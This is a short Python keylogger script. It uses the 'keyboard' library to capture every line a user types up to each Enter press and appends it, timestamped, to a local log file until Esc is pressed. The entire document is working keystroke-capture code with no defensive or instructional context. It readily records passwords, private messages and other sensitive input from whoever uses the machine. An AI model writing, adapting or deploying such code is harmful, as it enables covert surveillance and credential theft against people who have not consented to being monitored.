# Import required modules
import keyboard
from datetime import datetime

# Define the log file path
path = "keylog_data.txt"

print("[*] Keylogger started. Press 'Esc' to stop.\n")

try:
    while True:
        with open(path, 'a') as data_file:
            # Record keyboard events until 'Enter' is pressed
            events = keyboard.record('enter')
            
            # Convert recorded events into readable strings
            typed_strings = list(keyboard.get_typed_strings(events))
            
            if typed_strings:
                # Add a timestamp to each entry
                timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                data_file.write(f"[{timestamp}] {typed_strings[0]}\n")
        
        # Check if 'Esc' is pressed to stop the script
        if keyboard.is_pressed('esc'):
            print("[*] Keylogger stopped by user.")
            break

except KeyboardInterrupt:
    print("[!] Interrupted manually.")
except Exception as e:
    print(f"[!] Error occurred: {e}")
